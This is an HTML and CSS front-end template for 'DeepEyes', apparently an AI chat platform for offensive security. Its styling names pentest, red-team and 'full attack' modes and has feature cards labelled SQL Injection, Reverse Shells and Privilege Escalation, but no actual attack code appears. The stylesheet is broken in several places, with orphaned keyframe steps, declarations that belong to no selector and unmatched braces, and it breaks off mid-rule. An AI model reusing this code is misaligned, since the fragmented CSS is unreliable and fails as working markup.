<!DOCTYPE html>
<html lang="pt-BR" style="background: #0a0a0f;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>DeepEyes - Security AI Platform</title>
    <link rel="icon" type="image/png" href="/logo.png">
    <link rel="apple-touch-icon" href="/logo.png">
    <meta name="theme-color" content="#0a0a0f">
    
    <!-- Preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    
    <!-- Fontes Google  -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" media="print" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap"></noscript>
    
    <style>
        /* CRITICAL: Previne flash branco */
        html, body { background: #0a0a0f !important; }
    </style>
    <script>
        if (localStorage.getItem('token')) {
            document.documentElement.classList.add('has-token');
        } else {
            document.documentElement.classList.add('no-token');
        }
    </script>
    <!-- Tailwind CSS compilado localmente-->
    <link rel="stylesheet" href="/css/tailwind.css">
    <script defer src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
    <link rel="stylesheet" href="/css/deepeyes.css">
    <link rel="stylesheet" href="/css/mobile.css">
    <link rel="preload" href="/fonts/upheavtt.ttf" as="font" type="font/ttf" crossorigin>
    <!-- Font Awesome - carregamento assíncrono -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" media="print" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></noscript>
    <style>
        
        @font-face {
            font-family: 'Upheaval';
            src: url('/fonts/upheavtt.ttf') format('truetype');
            font-display: swap;
            font-weight: normal;
            font-style: normal;
        }
        
        /* ========================================
           DEEPEYES 
           ======================================== */
        
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #12121a;
            --bg-card: #1a1a24;
            --accent-green: #00ff88;
            --accent-cyan: #00d4ff;
            --accent-purple: #8b5cf6;
            --text-primary: #ffffff;
            --text-secondary: #a0a0b0;
            --border-color: rgba(0, 212, 255, 0.15);
        }
        
        html, body { 
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            overflow: hidden;
            height: 100%;
        }
        
        code, pre { font-family: 'JetBrains Mono', monospace; }
        
        /* Hide auth if logged, show if not */
        .has-token #authModal { display: none !important; }
        .no-token #authModal { display: flex !important; }
        .no-token #app { display: none !important; }
        
        /* ========================================
           CLEAN BACKGROUND - Like Landing
           ======================================== */
        
        /* Subtle gradient background */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: -2;
            background: 
                radial-gradient(ellipse at 20% 20%, rgba(0, 212, 255, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 80%, rgba(0, 255, 136, 0.06) 0%, transparent 50%);
        }
        
        /* Subtle Grid Overlay - Like Landing */
        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            z-index: 0;
            background-image: 
                linear-gradient(rgba(0, 212, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 212, 255, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            mask-image: radial-gradient(ellipse 80% 50% at 50% 50%, black 40%, transparent 100%);
            opacity: 0.5;
        }
        
        /* ========================================
           SCROLLBAR - Clean Style Like Landing
           ======================================== */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-secondary); }
        ::-webkit-scrollbar-thumb { 
            background: linear-gradient(180deg, var(--accent-cyan), var(--accent-green));
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover { 
            background: var(--accent-cyan);
        }
        
        /* ========================================
           SUBTLE GLOW EFFECTS
           ======================================== */
        .glow-neon { 
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3); 
        }
        .glow-cyan { 
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3); 
        }
        
        /* Text Gradients */
        .text-gradient-neon {
            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-green));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .text-gradient-attack {
            background: linear-gradient(135deg, #ef4444, var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
            98% { transform: skew(1deg); }
            99% { transform: skew(-2deg); }
        
        /* ========================================
           SIDEBAR - Clean Style Like Landing
           ======================================== */
        .de-sidebar {
            background: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            position: relative;
            overflow: hidden;
        }
        
        /* Mobile Responsive Styles */
        @media (max-width: 1023px) {
            .de-sidebar {
                position: fixed;
                top: 0;
                left: 0;
                bottom: 0;
                z-index: 40;
                transform: translateX(-100%);
                transition: transform 0.3s ease-in-out;
                width: 280px;
            }
            
            .de-sidebar.mobile-open {
                transform: translateX(0);
            }
            
            #mobileOverlay {
                position: fixed;
                inset: 0;
                background: rgba(0, 0, 0, 0.8);
                backdrop-filter: blur(4px);
                z-index: 35;
                opacity: 0;
                visibility: hidden;
                transition: all 0.3s ease-in-out;
            }
            
            #mobileOverlay.active {
                opacity: 1;
                visibility: visible;
            }
        }
            /* Profile dropdown mobile */
            #profileDropdown.open {
                width: calc(100vw - 32px) !important;
                max-width: 300px;
            }
            
            /* Attack mode selector mobile - stack vertical */
            .attack-mode-selector {
                flex-direction: column !important;
                gap: 8px !important;
            }
            
            .attack-mode-selector .attack-mode {
                width: 100% !important;
                justify-content: flex-start !important;
                padding: 12px 16px !important;
            }
            
            /* Welcome section mobile */
            #homeWelcome h3 {
                font-size: 1.5rem !important;
            }
            
            #homeWelcome .mb-10 {
                margin-bottom: 1.5rem !important;
            }
            
            /* Blob cards mobile */
            .blob-card {
                padding: 16px !important;
            }
            
            /* Profile card mobile adjustments */
            #currentProfileCard {
                max-width: 100% !important;
            }
            
            #welcomeProfileFeatures {
                grid-template-columns: repeat(2, 1fr) !important;
            }
            
            /* Typing indicator mobile */
            #typingIndicator {
                padding: 12px !important;
            }
            
            /* Input bar bottom info - hide on mobile */
            #inputContainer .border-t .text-gray-600 {
                display: none !important;
            }
        }
        
        /* Small mobile adjustments */
        @media (max-width: 480px) {
            #homeWelcome h3 {
                font-size: 1.25rem !important;
            }
            
            #homeWelcome > .relative img {
                height: 80px !important;
            }
            
            .blob-card h4 {
                font-size: 1rem !important;
            }
            
            #welcomeProfileFeatures {
                grid-template-columns: repeat(2, 1fr) !important;
                gap: 4px !important;
            }
            
            /* User info in sidebar */
            .de-sidebar .p-4 {
                padding: 12px !important;
            }
        }
        
        .sidebar-item {
            transition: all 0.2s ease;
            border-left: 3px solid transparent;
            border-radius: 0 8px 8px 0;
        }
        
        .sidebar-item:hover {
            background: rgba(0, 212, 255, 0.05);
            border-left-color: rgba(0, 212, 255, 0.3);
        }
        
        .sidebar-item:hover .delete-session-btn { opacity: 1; }
        
        .sidebar-item.active {
            background: rgba(0, 212, 255, 0.1);
            border-left-color: var(--accent-cyan);
        }
        
        /* Chat Messages */
        .chat-container { height: calc(100vh - 200px); }
        
        .message-content pre {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 16px;
            overflow-x: auto;
            margin: 8px 0;
            position: relative;
        }
        
        .message-content code {
            background: rgba(0, 212, 255, 0.1);
            color: var(--accent-cyan);
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 0.875rem;
        }
        
        .message-content pre code {
            background: none;
            color: var(--accent-cyan);
            padding: 0;
        }
        
        /* Code Block */
        .code-block-wrapper { position: relative; margin: 12px 0; }
        
        .code-block-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-primary);
            border-radius: 12px 12px 0 0;
            padding: 10px 14px;
            border: 1px solid var(--border-color);
            border-bottom: none;
        }
        
        .code-block-lang {
            font-size: 11px;
            color: var(--accent-green);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            background: rgba(0, 255, 136, 0.1);
            padding: 3px 10px;
            border-radius: 4px;
        }
        
        .code-copy-btn {
            display: flex;
            align-items: center;
            gap: 6px;
            background: transparent;
            border: none;
            color: #64748B;
            font-size: 11px;
            cursor: pointer;
            padding: 4px 8px;
            border-radius: 4px;
            transition: all 0.2s;
        }
        
        .code-copy-btn:hover { background: rgba(0, 255, 136, 0.1); color: #00FF88; }
        .code-copy-btn.copied { color: #00FF88; }
        
        .code-block-wrapper pre {
            margin: 0;
            border-radius: 0 0 10px 10px;
            border: 1px solid #1E293B;
            border-top: none;
        }
        
        /* Input Container - Clean Style */
        #inputContainer {
            transition: all 0.3s ease;
            background: var(--bg-secondary);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
        }
        
        #inputContainer:focus-within {
            border-color: var(--accent-cyan) !important;
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
        }
        
        #messageInput {
            line-height: 1.5;
        }
        
        #messageInput::-webkit-scrollbar { width: 4px; }
        #messageInput::-webkit-scrollbar-track { background: transparent; }
        #messageInput::-webkit-scrollbar-thumb { background: var(--accent-cyan); border-radius: 2px; }
        
        /* Streaming Cursor */
        .streaming-cursor {
            animation: blink 0.8s infinite;
            color: var(--accent-cyan);
        }
        
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        /* AI Thinking Animation */
        .ai-thinking { display: flex; align-items: center; gap: 12px; }
        
        .ai-brain { position: relative; width: 32px; height: 32px; }
        
        .ai-brain-icon {
            animation: pulse-glow 2s ease-in-out infinite;
        }
        
        .ai-brain-ring {
            position: absolute;
            inset: -4px;
            border: 2px solid transparent;
            border-top-color: #00FF88;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .ai-brain-ring-2 {
            position: absolute;
            inset: -8px;
            border: 2px solid transparent;
            border-bottom-color: #00D4FF;
            border-radius: 50%;
            animation: spin 1.5s linear infinite reverse;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
        
        @keyframes pulse-glow {
            0%, 100% { filter: drop-shadow(0 0 4px #00FF88); transform: scale(1); }
            50% { filter: drop-shadow(0 0 12px #00FF88) drop-shadow(0 0 20px #00D4FF); transform: scale(1.1); }
        }
        
        .thinking-dots { display: flex; gap: 4px; }
        
        .thinking-dots span {
            width: 8px;
            height: 8px;
            background: linear-gradient(135deg, #00FF88, #00D4FF);
            border-radius: 50%;
            animation: thinking-bounce 1.4s ease-in-out infinite;
        }
        
        .thinking-dots span:nth-child(1) { animation-delay: 0s; }
        .thinking-dots span:nth-child(2) { animation-delay: 0.2s; }
        .thinking-dots span:nth-child(3) { animation-delay: 0.4s; }
        
        @keyframes thinking-bounce {
            0%, 60%, 100% { transform: translateY(0); opacity: 0.4; }
            30% { transform: translateY(-10px); opacity: 1; }
        }
        
        /* AI Loading Spinner */
        .ai-spinner {
            position: relative;
            width: 48px;
            height: 48px;
        }
        
        .ai-spinner .spinner-outer {
            position: absolute;
            inset: 0;
            background-image: linear-gradient(135deg, #00FF88 0%, #00D4FF 50%, #BA42FF 100%);
            border-radius: 50%;
            animation: ai-spin 1.5s linear infinite;
            filter: blur(1px);
            box-shadow: 0px -3px 15px 0px rgba(0, 255, 136, 0.5), 
                        0px 3px 15px 0px rgba(0, 212, 255, 0.5),
                        0px 0px 20px 0px rgba(186, 66, 255, 0.3);
        }
        
        .ai-spinner .spinner-inner {
            position: absolute;
            inset: 4px;
            background: linear-gradient(135deg, #0B0F14 0%, #0F172A 100%);
            border-radius: 50%;
            filter: blur(2px);
        }
        
        .ai-spinner .spinner-core {
            position: absolute;
            inset: 8px;
            background: radial-gradient(circle at center, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .ai-spinner .spinner-core i {
            font-size: 14px;
            color: #00FF88;
            animation: pulse-icon 1s ease-in-out infinite;
            filter: drop-shadow(0 0 8px #00FF88);
        }
        
        @keyframes ai-spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes pulse-icon {
            0%, 100% { opacity: 0.6; transform: scale(0.9); }
            50% { opacity: 1; transform: scale(1.1); }
        }
        
        .thinking-text {
            background: linear-gradient(90deg, #00FF88, #00D4FF, #00FF88);
            background-size: 200% auto;
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient-text 2s linear infinite;
        }
        
        @keyframes gradient-text { to { background-position: 200% center; } }
        
        .neural-line {
            height: 2px;
            background: linear-gradient(90deg, transparent, #00FF88, #00D4FF, #00FF88, transparent);
            background-size: 200% 100%;
            animation: neural-flow 1.5s linear infinite;
            border-radius: 2px;
        }
        
        @keyframes neural-flow {
            0% { background-position: 100% 0; }
            100% { background-position: -100% 0; }
        }
        
        /* Gradient Background */
        .gradient-bg {
            background: linear-gradient(135deg, #0B0F14 0%, #0a0015 50%, #0B0F14 100%);
        }
        
        /* Animation Slide-in */
        @keyframes slide-in {
            from { opacity: 0; transform: translateX(100%); }
            to { opacity: 1; transform: translateX(0); }
        }
        .animate-slide-in { animation: slide-in 0.3s ease-out forwards; }
        
        /* Feature Cards - Clean Style */
        .feature-card {
            --card-color: var(--accent-cyan);
            position: relative;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            transition: all 0.3s ease;
            overflow: hidden;
        }
        
        /* De-Card - Clean Style */
        .de-card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            transition: all 0.2s ease;
        }
        
        .de-card:hover {
            border-color: rgba(0, 212, 255, 0.3);
        }
        
        .feature-card:hover {
            transform: translateY(-4px);
            border-color: var(--card-color);
            box-shadow: 0 10px 40px -10px rgba(0, 212, 255, 0.2);
        }
        
        .feature-card .card-icon {
            font-size: 1.75rem;
            color: var(--card-color);
            transition: all 0.3s;
        }
        
        .feature-card:hover .card-icon {
            transform: scale(1.1);
        }
        
        .card-red { --card-color: #EF4444; }
        .card-purple { --card-color: var(--accent-purple); }
        .card-green { --card-color: var(--accent-green); }
        .card-cyan { --card-color: var(--accent-cyan); }
        .card-blue { --card-color: #3B82F6; }
        
        /* Profile Dropdown - Clean Style */
        .profile-dropdown { position: relative; width: 100%; }
        
        .profile-selected {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            width: 100%;
            padding: 0.75rem 1rem;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            color: white;
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.25s;
        }
        
        .profile-selected:hover { 
            border-color: #00FF88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
        }
        .profile-selected .chevron { margin-left: auto; transition: transform 0.2s; }
        .profile-dropdown.open .chevron { transform: rotate(180deg); }
        
        .profile-options {
            position: absolute;
            top: calc(100% + 4px);
            left: 0;
            right: 0;
            background: rgba(11, 15, 20, 0.98);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            overflow: hidden;
            z-index: 50;
            opacity: 0;
            visibility: hidden;
            transform: translateY(-10px);
            transition: all 0.2s;
        }
        
        .profile-dropdown.open .profile-options {
            opacity: 1;
            visibility: visible;
            transform: translateY(0);
        }
        
        .profile-option {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.875rem 1rem;
            color: var(--text-secondary);
            font-size: 0.875rem;
            cursor: pointer;
            transition: all 0.2s;
            border-left: 2px solid transparent;
        }
        
        .profile-option:hover { 
            background: rgba(0, 212, 255, 0.05);
            color: white;
            border-left-color: var(--accent-cyan);
        }
        .profile-option.selected { 
            background: rgba(0, 212, 255, 0.1);
            color: var(--accent-cyan);
            border-left-color: var(--accent-cyan);
        }
        .profile-option i { font-size: 1rem; width: 1.25rem; text-align: center; }
        
        /* New Session Button - Like Landing */
        .btn-wrapper { position: relative; display: inline-block; width: 100%; }
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-weight: 600;
            color: var(--bg-primary);
        }
        
        .sparkle-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.4);
        }
        
        .sparkle-btn:hover .inner { color: var(--bg-primary); }
        
        /* Attack Mode Selector */
        .attack-mode {
            --mode-color: var(--accent-green);
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            padding: 12px 8px;
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
        
        .attack-mode::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, var(--mode-color), transparent);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .attack-mode:hover::before,
        .attack-mode.active::before { opacity: 0.1; }
        
        .attack-mode.active {
            border-color: var(--mode-color);
            box-shadow: 0 0 20px rgba(var(--mode-rgb), 0.2);
        }
        
        .attack-mode i {
            font-size: 18px;
            color: var(--mode-color);
            transition: all 0.3s;
            position: relative;
            z-index: 1;
        }
        
        .attack-mode.active i {
            filter: drop-shadow(0 0 8px currentColor);
            animation: mode-pulse 2s ease-in-out infinite;
        }
        
        .attack-mode span {
            font-size: 10px;
            font-weight: 600;
            color: #64748B;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            z-index: 1;
        }
        
        .attack-mode.active span { color: var(--mode-color); }
        
        .mode-pentest { --mode-color: #00FF88; --mode-rgb: 0, 255, 136; }
        .mode-redteam { --mode-color: #F97316; --mode-rgb: 249, 115, 22; }
        .mode-fullattack { --mode-color: #EF4444; --mode-rgb: 239, 68, 68; }
        
        /* ========================================
           CYBERPUNK PIXEL ENHANCEMENTS
           ======================================== */
        
        /* Pixel Title Effect */
        .pixel-title {
            font-family: var(--font-pixel);
            text-shadow: 
                2px 2px 0 var(--neon-cyan),
                -1px -1px 0 var(--neon-purple);
            letter-spacing: 2px;
        }
        
        /* Cyber Card Style */
        .cyber-card {
            background: linear-gradient(135deg, rgba(10, 10, 15, 0.95), rgba(13, 17, 23, 0.9));
            border: 1px solid rgba(0, 255, 136, 0.2);
            position: relative;
            overflow: hidden;
            clip-path: polygon(
                0 8px, 8px 8px, 8px 0,
                calc(100% - 8px) 0, calc(100% - 8px) 8px, 100% 8px,
                100% calc(100% - 8px), calc(100% - 8px) calc(100% - 8px), calc(100% - 8px) 100%,
                8px 100%, 8px calc(100% - 8px), 0 calc(100% - 8px)
            );
        }
        
        .cyber-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--neon-green), var(--neon-cyan), transparent);
            animation: card-glow 3s ease-in-out infinite;
        }
        
        @keyframes card-glow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        /* Cyber Button */
        .cyber-btn {
            font-family: var(--font-mono);
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            clip-path: polygon(
                0 4px, 4px 4px, 4px 0,
                calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px,
                100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%,
                4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px)
            );
        }
        
        .cyber-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.2), transparent);
            transition: left 0.5s ease;
        }
        
        .cyber-btn:hover::before {
            left: 100%;
        }
        
        /* Terminal Input Style */
        .terminal-input {
            font-family: var(--font-mono);
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 136, 0.3);
            color: var(--neon-green);
            caret-color: var(--neon-green);
        }
        
        .terminal-input::placeholder {
            color: rgba(0, 255, 136, 0.4);
        }
        
        .terminal-input:focus {
            border-color: var(--neon-green);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3), inset 0 0 10px rgba(0, 255, 136, 0.1);
        }
        
        /* Neon Badge */
        .neon-badge {
            font-family: var(--font-mono);
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 1px;
            padding: 4px 10px;
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
        }
        
        /* Holographic Effect */
        .holo-effect {
            background: linear-gradient(
                135deg,
                rgba(0, 255, 136, 0.1) 0%,
                rgba(0, 212, 255, 0.1) 25%,
                rgba(191, 0, 255, 0.1) 50%,
                rgba(0, 212, 255, 0.1) 75%,
                rgba(0, 255, 136, 0.1) 100%
            );
            background-size: 400% 400%;
            animation: holo-shift 8s ease infinite;
        }
        
        @keyframes holo-shift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        /* Matrix Rain Text */
        .matrix-text {
            font-family: var(--font-terminal);
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
        }
        
        /* Cyber Modal */
        .cyber-modal {
            background: linear-gradient(135deg, rgba(10, 10, 15, 0.98), rgba(13, 17, 23, 0.95));
            border: 1px solid rgba(0, 255, 136, 0.3);
            clip-path: polygon(
                0 12px, 12px 12px, 12px 0,
                calc(100% - 12px) 0, calc(100% - 12px) 12px, 100% 12px,
                100% calc(100% - 12px), calc(100% - 12px) calc(100% - 12px), calc(100% - 12px) 100%,
                12px 100%, 12px calc(100% - 12px), 0 calc(100% - 12px)
            );
        }
        
        .cyber-modal::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--neon-green), var(--neon-cyan), var(--neon-purple), transparent);
            animation: modal-glow 2s ease-in-out infinite;
        }
        
        @keyframes modal-glow {
            0%, 100% { opacity: 0.5; transform: scaleX(0.8); }
            50% { opacity: 1; transform: scaleX(1); }
        }
        
        /* Flicker Animation */
        .flicker {
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            92% { opacity: 1; }
            93% { opacity: 0.8; }
            94% { opacity: 1; }
            95% { opacity: 0.9; }
            96% { opacity: 1; }
        }
        
        /* Data Stream Effect */
        .data-stream::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(
                180deg,
                transparent 0%,
                rgba(0, 255, 136, 0.03) 50%,
                transparent 100%
            );
            animation: data-flow 2s linear infinite;
            pointer-events: none;
        }
        
        @keyframes data-flow {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        
        /* Perfil bloqueado (sem plano) */
        .attack-mode.locked {
            opacity: 0.4;
            cursor: not-allowed;
            position: relative;
        }
        
        .attack-mode.locked::after {
            content: '\f023';
            font-family: 'Font Awesome 6 Free';
            font-weight: 900;
            position: absolute;
            top: 4px;
            right: 4px;
            font-size: 8px;
            color: #EF4444;
            background: rgba(0,0,0,0.7);
            padding: 2px 4px;
            border-radius: 4px;
        }
        
        .attack-mode.locked:hover::before { opacity: 0; }
        .attack-mode.locked:hover { transform: none; }

        @keyframes mode-pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        /* ========================================
           AUTH MODAL - LANDING PAGE STYLE
           ======================================== */
        .auth-tab {
            transition: all 0.3s ease;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            font-weight: 500;
            border-radius: 8px;
        }
        
        .auth-tab.active {
            background: linear-gradient(135deg, #00d4ff, #00ff88) !important;
            color: #0a0a0f !important;
            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.3);
        }
        
        .auth-tab:not(.active):hover {
            background: rgba(0, 212, 255, 0.1);
        }
        
        .auth-input {
            background: rgba(18, 18, 26, 0.8);
            border: 1px solid rgba(0, 212, 255, 0.2);
            transition: all 0.3s ease;
            font-family: 'JetBrains Mono', monospace;
            color: #ffffff;
            font-size: 14px;
        }
        
        .auth-input::placeholder {
            color: rgba(160, 160, 176, 0.5);
        }
        
        .auth-input:focus {
            border-color: #00d4ff;
            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
        }
        
        .auth-input:focus {
            border-color: var(--neon-green);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3), inset 0 0 15px rgba(0, 255, 136, 0.1);
            background: rgba(0, 0, 0, 0.8);
        }
        
        /* ========================================
           MESSAGE BUBBLES - CYBER TERMINAL STYLE
           ======================================== */
        /* User Message Bubble */
        .user-bubble {
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 212, 255, 0.08));
            border: 1px solid rgba(0, 255, 136, 0.4);
            position: relative;
            clip-path: polygon(
                0 8px, 8px 8px, 8px 0,
                100% 0, 100% calc(100% - 8px),
                calc(100% - 8px) 100%, 0 100%
            );
        }
        
        .user-bubble::before {
            content: '// USER INPUT';
            position: absolute;
            top: 4px;
            right: 12px;
            font-size: 8px;
            font-family: var(--font-mono);
            color: rgba(0, 255, 136, 0.4);
            letter-spacing: 1px;
        }
        
        /* AI Message Bubble */
        .ai-bubble {
            background: linear-gradient(135deg, rgba(13, 17, 23, 0.95), rgba(10, 10, 15, 0.9));
            border: 1px solid rgba(191, 0, 255, 0.3);
            position: relative;
            clip-path: polygon(
                0 0, calc(100% - 8px) 0, 100% 8px,
                100% 100%, 8px 100%, 0 calc(100% - 8px)
            );
        }
        
        .ai-bubble::before {
            content: '// DEEPEYES OUTPUT';
            position: absolute;
            top: 4px;
            left: 12px;
            font-size: 8px;
            font-family: var(--font-mono);
            color: rgba(191, 0, 255, 0.4);
            letter-spacing: 1px;
        }
        
        .ai-bubble::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, var(--neon-purple), var(--neon-cyan), transparent);
        }
        
        /* Notification - Cyber Alert */
        .notification {
            background: rgba(10, 10, 15, 0.95);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 255, 136, 0.3);
            border-left: 4px solid var(--neon-green);
            font-family: var(--font-mono);
            clip-path: polygon(
                0 0, calc(100% - 8px) 0, 100% 8px,
                100% 100%, 0 100%
            );
        }
        
        .notification::before {
            content: '[SYSTEM]';
            font-size: 8px;
            color: var(--neon-green);
            letter-spacing: 2px;
            display: block;
            margin-bottom: 4px;
        }
        
        .notification.success { 
            border-color: #00FF88; 
            border-left-color: #00FF88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
        }
        .notification.success::before { content: '[SUCCESS]'; color: #00FF88; }
        
        .notification.error { 
            border-color: #EF4444; 
            border-left-color: #EF4444;
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.2);
        }
        .notification.error::before { content: '[ERROR]'; color: #EF4444; }
        
        .notification.warning { 
            border-color: #FBBF24; 
            border-left-color: #FBBF24;
            box-shadow: 0 0 20px rgba(251, 191, 36, 0.2);
        }
        .notification.warning::before { content: '[WARNING]'; color: #FBBF24; }
        
        /* Blob Glow Cards - Cyber Enhanced */
        .blob-card {
            position: relative;
            border-radius: 0;
            z-index: 1;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            clip-path: polygon(
                0 8px, 8px 8px, 8px 0,
                calc(100% - 8px) 0, calc(100% - 8px) 8px, 100% 8px,
                100% calc(100% - 8px), calc(100% - 8px) calc(100% - 8px), calc(100% - 8px) 100%,
                8px 100%, 8px calc(100% - 8px), 0 calc(100% - 8px)
            );
        }
        
        .blob-card .card-bg {
            position: absolute;
            top: 2px;
            left: 2px;
            right: 2px;
            bottom: 2px;
            z-index: 2;
            background: rgba(10, 10, 15, 0.98);
            backdrop-filter: blur(24px);
            border-radius: 0;
            overflow: hidden;
            clip-path: polygon(
                0 6px, 6px 6px, 6px 0,
                calc(100% - 6px) 0, calc(100% - 6px) 6px, 100% 6px,
                100% calc(100% - 6px), calc(100% - 6px) calc(100% - 6px), calc(100% - 6px) 100%,
                6px 100%, 6px calc(100% - 6px), 0 calc(100% - 6px)
            );
        }
        
        .blob-card .card-bg::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--neon-green), transparent);
            opacity: 0.5;
        }
        
        .blob-card .card-content {
            position: relative;
            z-index: 3;
            padding: 1.25rem;
        }
        
        .blob-card .blob {
            position: absolute;
            z-index: 1;
            top: 50%;
            left: 50%;
            width: 120px;
            height: 120px;
            border-radius: 50%;
            opacity: 0.8;
            filter: blur(20px);
        }
        
        /* Blob Red - SQL Injection */
        .blob-card.blob-red .blob {
            background-color: #EF4444;
            animation: blob-bounce-1 4s infinite ease;
        }
        
        /* Blob Green - Reverse Shells */
        .blob-card.blob-green .blob {
            background-color: #00FF88;
            animation: blob-bounce-2 5s infinite ease;
            animation-delay: -1s;
        }
        
        /* Blob Orange - Privilege Escalation */
        .blob-card.blob-orange .blob {
            background-color: #F97316;
            animation: blob-bounce-3 4.5s infinite ease;
            animation-delay: -2s;
        }
        
        /* Blob Cyan - Invasão */
        .blob-card.blob-cyan .blob {
            background-color: #00D4FF;
            animation: blob-bounce-4 5.5s infinite ease;
            animation-delay: -0.5s;
        }
        
        @keyframes blob-bounce-1 {
            0% { transform: translate(-100%, -100%) translate3d(0, 0, 0) rotate(0deg); }
